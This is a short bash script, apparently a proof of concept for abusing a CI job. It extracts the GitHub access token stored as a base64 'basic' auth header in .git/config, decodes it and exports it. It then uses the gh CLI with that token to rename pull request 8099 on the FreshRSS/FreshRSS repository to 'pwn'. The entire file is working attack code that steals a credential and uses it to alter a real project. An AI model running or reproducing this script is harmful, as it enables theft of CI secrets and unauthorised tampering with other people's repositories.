#!/bin/bash

export GITHUB_TOKEN="$(grep -oP 'basic \K[^$]*' .git/config | base64 -d | sed 's/x-access-token://')"

gh repo set-default FreshRSS/FreshRSS
gh pr edit 8099 -t "pwn"
